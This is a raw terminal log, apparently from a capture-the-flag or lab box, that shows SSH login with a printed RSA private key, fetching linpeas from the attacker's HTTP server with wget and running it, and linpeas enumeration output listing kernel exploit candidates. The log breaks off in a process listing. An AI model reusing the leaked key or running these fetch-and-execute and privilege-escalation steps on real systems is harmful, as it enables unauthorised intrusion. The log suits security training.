8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~]
└─$ nano id_rsa_jack
                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat id_rsa_jack 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----


┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa_jack 
                                                                                      
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa_jack jack@10.10.12.106
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

143 packages can be updated.
92 updates are security updates.


Last login: Mon Nov 16 14:27:49 2020 from 10.11.12.223
jack@jack:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)

┌──(kali㉿kali)-[~/Downloads]
└─$ locate pspy     
/home/kali/hackthebox/pspy64s
/home/kali/nappy/pspy64s
                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../hackthebox       
                                                                                                      
┌──(kali㉿kali)-[~/hackthebox]
└─$ ls         
allowed.userlist                        gato.jpg_original  nc64.exe           Responder
allowed.userlist.passwd                 hash_vaccine       privesc_creds.xml  revshell.php
backup.zip                              hash_zip           prod.dtsConfig     rogue-jndi
car.py                                  id_rsa             pspy64s            share
exploit_redpanda.py                     index.php          racecar            style.css
ferox-http_shoppy_htb-1667929122.state  josh.hash          racecar.zip        winPEASx64.exe
gato.jpg                                linpeas.sh         r.elf              woodenk@10.10.11.170
                                                                                                      
┌──(kali㉿kali)-[~/hackthebox]
└─$ python3 -m http.server 8000                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


ack@jack:~/.ssh$ cd ..
jack@jack:~$ ls
reminder.txt  user.txt
jack@jack:~$ cd /tmp
jack@jack:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
--2023-01-18 14:52:40--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            100%[=======================>] 758.81K   608KB/s    in 1.2s    

2023-01-18 14:52:41 (608 KB/s) - ‘linpeas.sh’ saved [777018/777018]

jack@jack:/tmp$ chmod +x linpeas.sh;./linpeas.sh

jack@jack:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
User & Groups: uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
Hostname: jack
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Wed Jan 18 15:16:23 CST 2023
 15:16:23 up 27 min,  2 users,  load average: 0.19, 0.15, 0.38

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=67a0c1f9-b482-40ba-8e93-f188d141fe64	/	ext4	errors=remount-ro	0 1
UUID=5aa0286c-eea1-44e2-b918-7041334f10a1	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/jack
SSH_CLIENT=10.8.19.103 39380 22
USER=jack
SHLVL=1
OLDPWD=/home/jack
HOME=/home/jack
SSH_TTY=/dev/pts/1
LOGNAME=jack
_=./linpeas.sh
XDG_SESSION_ID=16
TERM=xterm-256color
PATH=/home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_CONNECTION=10.8.19.103 39380 10.10.12.106 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.6  0.5  38016  6036 ?        Ss   14:48   0:11 /sbin/init
root       355  0.0  0.2  28348  2764 ?        Ss   14:49   0:00 /lib/systemd/systemd-journald
root       397  0.0  0.1  94772  1580 ?        Ss   14:49   0:00 /sbin/lvmetad -f
root       438  0.0  0.4  44700  4244 ?        Ss   14:49   0:01 /lib/systemd/systemd-udevd
systemd+   476  0.0  0.2 100324  2504 ?        Ssl  14:49   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       721  0.0  0.0  16128   864 ?        Ss   14:49   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       865  0.0  0.2  29008  2952 ?        Ss   14:49   0:00 /usr/sbin/cron -f
daemon[0m     876  0.0  0.2  26044  2244 ?        Ss   14:49   0:00 /usr/sbin/atd -f
root       879  0.0  0.2  28544  3004 ?        Ss   14:49   0:00 /lib/systemd/systemd-logind
root       882  5.1  0.3 645336  3428 ?        Ssl  14:49   1:23 /usr/bin/lxcfs /var/lib/lxcfs/
syslog     890  0.0  0.3 256396  3164 ?        Ssl  14:49   0:00 /usr/sbin/rsyslogd -n
root       892  0.0  2.4 214272 24956 ?        Ssl  14:49   0:00 /usr/lib/snapd/snapd
message+   901  0.0  0.3  42932  3928 ?        Ss   14:49   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
